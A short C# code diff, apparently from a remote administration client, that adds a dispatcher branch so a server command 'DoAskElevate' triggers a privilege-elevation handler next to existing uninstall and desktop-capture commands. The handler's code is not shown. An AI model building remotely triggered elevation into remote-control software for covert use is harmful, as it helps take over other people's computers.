@@ -31,6 +31,10 @@ namespace xClient.Core.Packets
             {
                 CommandHandler.HandleDoClientUninstall((ServerPackets.DoClientUninstall)packet, client);
             }
+            else if (type == typeof(ServerPackets.DoAskElevate))
+            {
+                CommandHandler.HandleAskElevate((ServerPackets.DoAskElevate)packet, client);
+            }
             else if (type == typeof(ServerPackets.GetDesktop))
             {
                 CommandHandler.HandleGetDesktop((ServerPackets.GetDesktop)packet, client);
